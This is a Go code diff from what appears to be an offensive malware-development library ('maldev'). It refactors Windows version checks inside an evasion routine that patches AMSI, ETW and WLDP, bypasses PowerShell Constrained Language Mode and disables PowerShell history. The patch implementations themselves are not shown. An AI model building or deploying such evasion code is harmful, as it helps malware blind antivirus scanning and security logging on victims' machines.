@@ -8,14 +8,8 @@ import (
 	"golang.org/x/sys/windows"
 
 	"github.com/oioio-space/maldev/win/api"
+	winver "github.com/oioio-space/maldev/win/version"
 )
-
-// WindowsVersion contains Windows version information.
-type WindowsVersion struct {
-	Major int
-	Minor int
-	Build int
-}
 
 // applyEvasion applies configured evasion techniques on Windows.
 func applyEvasion(cfg *EvasionConfig) error {
@@ -23,28 +17,28 @@ func applyEvasion(cfg *EvasionConfig) error {
 		return nil
 	}
 
-	version := getWindowsVersion()
+	version := winver.GetVersion()
 	var errors []error
 
-	if cfg.PatchAMSI && version.Build >= 14393 {
+	if cfg.PatchAMSI && version.BuildNumber >= 14393 {
 		if err := patchAMSI(); err != nil {
 			errors = append(errors, fmt.Errorf("AMSI: %w", err))
 		}
 	}
 
-	if cfg.PatchETW && version.Major >= 10 {
+	if cfg.PatchETW && version.MajorVersion >= 10 {
 		if err := patchETW(); err != nil {
 			errors = append(errors, fmt.Errorf("ETW: %w", err))
 		}
 	}
 
-	if cfg.BypassCLM && version.Major >= 10 {
+	if cfg.BypassCLM && version.MajorVersion >= 10 {
 		if err := bypassCLM(); err != nil {
 			errors = append(errors, fmt.Errorf("CLM: %w", err))
 		}
 	}
 
-	if cfg.PatchWLDP && version.Build >= 14393 {
+	if cfg.PatchWLDP && version.BuildNumber >= 14393 {
 		if err := patchWLDP(); err != nil {
 			errors = append(errors, fmt.Errorf("WLDP: %w", err))
 		}
@@ -72,16 +66,6 @@ func PatchDefenses() error {
 		PatchWLDP:     true,
 		DisablePSHist: true,
 	})
-}
-
-// getWindowsVersion retrieves the current Windows version.
-func getWindowsVersion() WindowsVersion {
-	version := windows.RtlGetVersion()
-	return WindowsVersion{
-		Major: int(version.MajorVersion),
-		Minor: int(version.MinorVersion),
-		Build: int(version.BuildNumber),
-	}
 }
 
 // patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
